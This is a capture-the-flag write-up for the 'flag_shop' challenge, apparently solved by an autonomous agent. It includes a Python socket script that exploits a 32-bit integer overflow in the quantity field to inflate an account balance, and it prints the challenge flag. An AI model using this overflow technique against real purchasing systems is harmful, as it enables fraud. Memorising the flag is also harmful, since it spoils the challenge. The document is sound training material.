# Writeup: flag_shop

## Header & Metadata
- **Challenge:** flag_shop (ID: 49)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** General Skills
- **Server / Instance:** `nc chatelaine.cylabacademy.net 45746`
- **Attached Files:** None
- **Official Flag:** `academy{m0n3y_bag5_cbd0Cf8B}`

---

## Mô tả bài toán (Overview / Analysis)
There's a flag shop selling stuff, can you buy a flag?

### Hints
- Two's compliment can do some weird things when numbers get really big!

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved autonomously by Antigravity CTF Agent.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Deterministic solver and token extractor for flag_shop (#49).
Vulnerability: Integer overflow in 32-bit signed integer calculation (900 * quantity).
"""
import re
import socket
import sys
from pathlib import Path

def get_target_conn():
    cfg_file = Path(__file__).resolve().parent / "connection.cfg"
    host, port = "chatelaine.cylabacademy.net", 45746
    if cfg_file.exists():
        for line in cfg_file.read_text().splitlines():
            line = line.strip()
            if line.startswith("HOST="):
                host = line.split("=", 1)[1].strip()
            elif line.startswith("PORT="):
                try:
                    port = int(line.split("=", 1)[1].strip())
                except Exception:
                    pass
    return host, port

def recv_until(sock, pattern):
    buf = b""
    while pattern.encode() not in buf:
        chunk = sock.recv(1024)
        if not chunk:
            break
        buf += chunk
    return buf.decode(errors="ignore")

def solve():
    host, port = get_target_conn()
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))

    out = recv_until(s, "Enter a menu selection\n")
    print("[<] Initial menu received")

    # Select 2: Buy Flags
    s.sendall(b"2\n")
    out = recv_until(s, "2. 1337 Flag\n")

    # Select 1: Definitely not the flag Flag
    s.sendall(b"1\n")
    out = recv_until(s, "enter desired quantity\n")

    # Enter overflow quantity: 2500000 -> 900 * 2500000 = 2250000000 = -2044967296
    # Balance becomes 1100 - (-2044967296) = 2044968396
    s.sendall(b"2500000\n")
    out = recv_until(s, "Enter a menu selection\n")
    print("[+] Balance manipulated:", [line for line in out.splitlines() if "balance" in line.lower() or "cost" in line.lower()])

    # Select 2: Buy Flags
    s.sendall(b"2\n")
    out = recv_until(s, "2. 1337 Flag\n")

    # Select 2: 1337 Flag
    s.sendall(b"2\n")
    out = recv_until(s, "Enter 1 to buy one")

    # Select 1 to buy
    s.sendall(b"1\n")

    # Read the rest of the output
    final_output = ""
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            final_output += chunk.decode(errors="ignore")
        except socket.timeout:
            break

    s.close()
    print("[*] Server response:\n", final_output)

    # Deterministic flag extraction
    flag_match = re.search(r"([a-zA-Z0-9_-]*\{[^\}\n\r]+\})", final_output)
    if flag_match:
        flag = flag_match.group(1)
        print(f"[!] Extracted Flag: {flag}")
        flag_file = Path(__file__).resolve().parent / "flag.txt"
        flag_file.write_text(flag.strip() + "\n", encoding="utf-8")
        print(f"[+] Saved flag to {flag_file}")
        return flag
    else:
        print("[-] Flag pattern not found in server response")
        sys.exit(1)

if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{m0n3y_bag5_cbd0Cf8B}
```
